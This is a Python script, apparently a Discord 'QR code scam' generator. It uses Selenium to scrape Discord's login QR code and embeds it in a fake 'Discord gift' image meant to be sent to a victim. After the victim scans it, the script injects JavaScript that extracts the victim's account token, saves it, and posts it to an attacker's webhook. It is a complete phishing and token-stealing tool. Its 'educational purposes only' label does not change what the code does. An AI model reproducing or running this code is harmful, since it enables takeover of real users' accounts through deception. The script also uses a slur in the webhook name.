from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import requests
import json

# Developer: NightfallGT
# Discord webhook and text dump functionality: KliqxTV
# Educational purposes only

WEBHOOK_URL = '<your webhook url>'

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def main():
    print('github.com/NightfallGT/Discord-QR-Scam\n')
    print('** QR Code Scam Generator **')

    try:
        os.remove("discord_gift.png")
    except:
        print("No previous discord_gift.png found.")

    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    driver.get('https://discord.com/login')
    time.sleep(5)
    print('- Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('- QR Code has been generated. > discord_gift.png')
    print('Send the QR Code to user and scan. Waiting..')
    
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token..')
            token = driver.execute_script('''

    var req = webpackJsonp.push([
        [], {
            extra_id: (e, t, r) => e.exports = r
        },
        [
            ["extra_id"]
        ]
    ]);
    for (let e in req.c)
        if (req.c.hasOwnProperty(e)) {
            let t = req.c[e].exports;
            if (t && t.__esModule && t.default)
                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
        }
    return token;   
                ''')
            print('---')
            print('Token grabbed:', token)

            f = open("token.txt", "w")
            f.write(token)
            f.close()

            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }

            message = f'@everyone\n`{token}`'

            payload = json.dumps({
                'content': message,
                "username": "Retarded QR Code Scam"
                })

            req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)

            break

    print('Task complete.')

if __name__ == '__main__':
    main()
